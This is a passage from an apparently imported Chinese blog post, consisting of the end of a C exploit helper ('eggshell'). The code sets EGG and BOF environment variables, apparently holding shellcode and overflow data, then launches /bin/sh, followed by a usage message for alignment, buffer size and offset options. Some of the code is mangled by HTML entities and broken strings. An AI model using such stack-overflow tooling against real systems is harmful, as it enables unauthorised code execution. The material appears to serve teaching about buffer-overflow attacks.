&nbsp;&nbsp;memcpy(egg,"EGG=",4);

&nbsp;&nbsp;putenv(egg);

&nbsp;&nbsp;memcpy(bof,"BOF=",4);

&nbsp;&nbsp;putenv(bof);

&nbsp;&nbsp;system("/bin/sh");

}

void usage(void) {

&nbsp;&nbsp;(void)fprintf(stderr,

&nbsp; &nbsp; "usage: eggshell [-a &lt;alignment&gt;] [-b &lt;buffersize&gt;] [-e &lt;eggsize&gt;] [-o &lt;offs

et&gt;]"n");

}

------------------------------------------------------------------------------ 

</div>

**[温馨提示]：该文章由原博客园导入而来，如排版效果不佳，请移步：[http://www.cnblogs.com/coderzh/archive/2008/08/20/1272183.html](http://www.cnblogs.com/coderzh/archive/2008/08/20/1272183.html)**